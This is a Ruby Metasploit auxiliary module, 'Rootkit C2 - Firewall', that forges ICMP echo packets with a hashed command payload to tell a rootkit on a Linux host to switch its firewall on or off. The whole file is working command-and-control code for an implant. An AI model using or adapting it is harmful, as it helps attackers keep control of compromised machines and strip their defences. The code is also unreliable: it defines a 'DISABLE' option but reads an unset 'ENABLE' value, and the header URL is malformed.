##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Rootkit C2 - Firewall',
      'Description'   => %q{Toggle the host firewall},
      'License'       => MSF_LICENSE,
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell'],
      'Author'        => ['Anthony Miller-Rhodes']
    ))
    register_options(
      [
        OptBool.new('DISABLE', [ true, 'To disable the firewall or not', true]),
        OptString.new('LHOST', [ true, "The IP address of the attacking system" ]),
        OptString.new('RHOST', [ true, "The IP address of the system running the rootkit"]),
      ], self.class)

    deregister_options('FILTER','PCAPFILE','SNAPLEN','TIMEOUT')
  end

  def run
    open_pcap

    pcap = self.capture

    @lhost = IPAddr.new datastore['LHOST']
    @rhost = IPAddr.new datastore['RHOST']
    @enable = (datastore['ENABLE'] ? 1 : 0)

    capture_sendto(icmp_packet, @rhost.to_s)

    close_pcap

  end

  def icmp_payload
    cmd = [1].pack('N')
    data_enable = [@enable].pack('N')
    blank = [0].pack('N')
    hash_data =  "#{data_enable}#{blank}#{@rhost.hton}"
    hash = Digest::SHA1.hexdigest hash_data
    "#{[hash].pack('H*')}#{cmd}#{data_enable}#{blank}"
  end

  def icmp_packet
    print_status("Crafting payload")
    icmp = PacketFu::ICMPPacket.new
    icmp.ip_src = @lhost.hton
    icmp.ip_dst = @rhost.hton
    icmp.icmp_type = 8
    icmp.payload = capture_icmp_echo_pack(1, 1, icmp_payload << Rex::Text.rand_text(26))
    icmp.recalc
    print_status("Sending payload")
    icmp
  end

end
